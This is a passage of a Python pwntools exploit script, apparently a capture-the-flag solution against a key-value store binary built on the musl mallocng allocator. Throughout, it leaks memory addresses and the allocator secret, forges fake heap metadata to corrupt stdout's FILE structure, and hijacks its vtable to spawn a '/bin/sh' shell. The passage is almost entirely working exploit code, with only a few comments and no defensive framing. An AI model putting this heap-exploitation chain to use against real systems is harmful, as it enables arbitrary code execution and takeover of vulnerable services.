        if key_size is None:
            key_size = len(key_content)
        p.sendlineafter('size: ', str(key_size))
        if wait:
            p.recvuntil('content: ')
        p.send(key_content)
    def delete(key_content, key_size=None):
        p.sendlineafter('option: ', '3')
        if key_size is None:
            key_size = len(key_content)
        p.sendlineafter('size: ', str(key_size))
        p.sendafter('content: ', key_content)
    def get_hash(content):
        x = 0x7e5
        for c in content:
            x = ord(c) + x * 0x13377331
        return x & 0xfff
    def find_key(length=0x10, h=0x7e5):
        while True:
            x = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))
            if get_hash(x) == h:
                return x
    def pwn():
        info("pwnit!")
        ###Info Leak
        store('A', 'A')#AAAAAAU
        #clear for reusing freed chunks
        for _ in range(5):
            query('A' * 0x30)#AFFFFFU
        store('\n', 'A' * 0x30)#UAAAAAU -> UAAAA[U]U #0x4040+0x7e5*8 = 0x7f68   []就是要控的chunk
        store(find_key(), 'A')#UAAAU[U]U
        delete('\n')#FAAAU[F]U
        #clear for reusing freed chunks
        for _ in range(3):
            query('A' * 0x30)#FFFFU[F]U
        store('A\n', 'A', 0x1200)#FFFFU[U]U 现在[U] chunk存放了key_ptr与value_ptr
        query('\n')
        res = codecs.decode(p.rl(False).split(b':')[1], 'hex')
        mmap_base = u64(res[:8]) - 0x20
        chunk_addr = u64(res[8:0x10])
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(chunk_addr - 0x60) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        heap_base = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8]) - 0x1d0
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(heap_base + 0xf0) + p64(0) + p64(0x200) + p64(0x7e5) + p64(0))
        query('\n')
        libc.address = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8]) - 0xb7040
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(next(libc.search(b'/bin/sh\0'))) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        assert codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8] == b'/bin/sh\0'
        for _ in range(3):
            query('A' * 0x30)
        query(p64(0) + p64(heap_base) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        query('\n')
        secret = u64(codecs.decode(p.rl(False).split(b':')[1], 'hex')[:8])
        log.info('mmap base: %#x' % mmap_base)
        log.info('chunk address: %#x' % chunk_addr)
        log.info('heap base: %#x' % heap_base)
        log.info('libc base: %#x' % libc.address)
        log.info('secret: %#x' % secret)
        fake_meta_addr = mmap_base + 0x2010
        fake_mem_addr = mmap_base + 0x2040
        stdout = libc.address + 0xb4280  
        log.info('fake_meta_addr: %#x' % fake_meta_addr)
        log.info('fake_mem_addr: %#x' % fake_mem_addr)
        log.info('stdout: %#x' % stdout)
        # Overwrite stdout-0x10 to fake_meta_addr using dequeue during free
        sc = 8 # 0x90
        freeable = 1
        last_idx = 0
        maplen = 1
        fake_meta = b''
        fake_meta += p64(stdout - 0x18) # prev
        fake_meta += p64(fake_meta_addr + 0x30) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((maplen << 12) | (sc << 6) | (freeable << 5) | last_idx)
        fake_meta += p64(0)
        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)
        payload = b''
        payload += b'A' * 0xaa0
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'
        for _ in range(2):
            query('A' * 0x30)
        query(payload, 0x1200)
        store('A', p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        delete('\n')
        # Create a fake bin using enqueue during free
        sc = 8 # 0x90
        last_idx = 1
        fake_meta = b''
        fake_meta += p64(0) # prev
        fake_meta += p64(0) # next
        fake_meta += p64(fake_mem_addr) # mem
        fake_meta += p32(0) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += p64(0)
        fake_mem = b''
        fake_mem += p64(fake_meta_addr) # meta
        fake_mem += p32(1) # active_idx
        fake_mem += p32(0)
        payload = b''
        payload += b'A' * 0xa90
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += fake_mem
        payload += b'\n'
        query('A' * 0x30)
        query(payload, 0x1200)
        store('A', p64(0) + p64(fake_mem_addr + 0x10) + p64(0) + p64(0x20) + p64(0x7e5) + p64(0))
        delete('\n')
        # Overwrite the fake bin so that it points to stdout
        fake_meta = b''
        fake_meta += p64(fake_meta_addr) # prev
        fake_meta += p64(fake_meta_addr) # next
        fake_meta += p64(stdout - 0x10) # mem
        fake_meta += p32(1) + p32(0) # avail_mask, freed_mask
        fake_meta += p64((sc << 6) | last_idx)
        fake_meta += b'A' * 0x18
        fake_meta += p64(stdout - 0x10)
        payload = b''
        payload += b'A' * 0xa80
        payload += p64(secret) + p64(0)
        payload += fake_meta
        payload += b'\n'
        query(payload, 0x1200)
        # Call calloc(0x80) which returns stdout and call system("/bin/sh") by overwriting vtable
        payload = b''
        payload += b'/bin/sh\0'
        payload += b'A' * 0x20
        payload += p64(heap_base + 1)
        payload += b'A' * 8
        payload += p64(heap_base)
        payload += b'A' * 8
        payload += p64(libc.symbols['system'])
        payload += b'A' * 0x3c
        payload += p32((1<<32)-1)
        payload += b'\n'
        store('A', payload, value_size=0x80, wait=False)
        #debug()
        p.irt()
    if __name__ == "__main__":
        pwn()